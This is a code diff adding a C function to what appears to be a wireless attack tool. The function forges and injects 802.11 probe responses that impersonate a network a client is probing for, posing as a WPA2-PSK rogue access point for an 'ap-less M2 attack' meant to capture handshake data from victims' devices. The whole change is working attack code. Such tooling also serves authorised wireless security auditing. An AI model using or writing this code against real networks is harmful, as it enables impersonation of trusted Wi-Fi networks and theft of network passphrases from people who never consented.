@@ -194,6 +194,34 @@ static int send_assoc_req(struct inject *i, const uint8_t bssid[6],
 	return send_frame(i, pkt, RT_HDR_LEN + pos);
 }
 
+/* A: a rogue-AP probe response — impersonate `ssid` from the fabricated
+ * `bssid` back to the `client` that just probed for it, advertising WPA2-PSK
+ * on `channel`. Used by the ap-less M2 attack (src/apless.c), opt-in only. */
+int inject_probe_response(struct inject *i, const uint8_t bssid[6],
+                          const uint8_t client[6],
+                          const char *ssid, uint8_t ssid_len, int channel)
+{
+	if (!i || !bssid || !client || ssid_len > 32) return -1;
+
+	uint8_t pkt[RT_HDR_LEN + 24 + 12 + 2 + 32 + sizeof RATES_IE + 3 + sizeof RSN_IE_WPA2_PSK];
+	memcpy(pkt, RT_TX_HDR, RT_HDR_LEN);
+	uint8_t *frame = pkt + RT_HDR_LEN;
+
+	/* probe response (0x50): DA=client, SA=BSSID=rogue AP */
+	size_t pos = build_mgmt_hdr(frame, 0x50, client, bssid, bssid);
+	memset(frame + pos, 0, 8); pos += 8;                 /* timestamp */
+	frame[pos++] = 0x64; frame[pos++] = 0x00;            /* beacon interval 100 TU */
+	frame[pos++] = 0x31; frame[pos++] = 0x04;            /* capability: ESS+Privacy+... */
+	frame[pos++] = 0x00; frame[pos++] = ssid_len;        /* SSID IE */
+	if (ssid_len > 0) { memcpy(frame + pos, ssid, ssid_len); pos += ssid_len; }
+	memcpy(frame + pos, RATES_IE, sizeof RATES_IE); pos += sizeof RATES_IE;
+	frame[pos++] = 0x03; frame[pos++] = 0x01;            /* DS Parameter Set */
+	frame[pos++] = (uint8_t)channel;
+	memcpy(frame + pos, RSN_IE_WPA2_PSK, sizeof RSN_IE_WPA2_PSK); pos += sizeof RSN_IE_WPA2_PSK;
+
+	return send_frame(i, pkt, RT_HDR_LEN + pos);
+}
+
 int inject_assoc(struct inject *i, const uint8_t bssid[6],
                  const char *ssid, uint8_t ssid_len)
 {
